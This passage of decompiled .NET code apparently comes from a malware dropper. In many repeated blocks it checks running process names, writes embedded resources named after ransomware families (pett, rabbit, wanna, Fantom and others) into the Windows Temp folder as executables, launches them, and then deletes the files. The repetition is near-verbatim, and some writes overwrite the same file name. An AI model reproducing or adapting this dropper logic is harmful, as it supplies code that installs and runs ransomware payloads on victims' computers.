				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array19 = processes;
		foreach (Process process19 in array19)
		{
			if (Operators.CompareString(text17, process19.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array20 = processes;
		foreach (Process process20 in array20)
		{
			if (Operators.CompareString(text18, process20.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array21 = processes;
		foreach (Process process21 in array21)
		{
			if (Operators.CompareString(text19, process21.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array22 = processes;
		foreach (Process process22 in array22)
		{
			if (Operators.CompareString(text20, process22.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array23 = processes;
		foreach (Process process23 in array23)
		{
			if (Operators.CompareString(text21, process23.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array24 = processes;
		foreach (Process process24 in array24)
		{
			if (Operators.CompareString(text22, process24.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array25 = processes;
		foreach (Process process25 in array25)
		{
			if (Operators.CompareString(text23, process25.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array26 = processes;
		foreach (Process process26 in array26)
		{
			if (Operators.CompareString(text24, process26.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
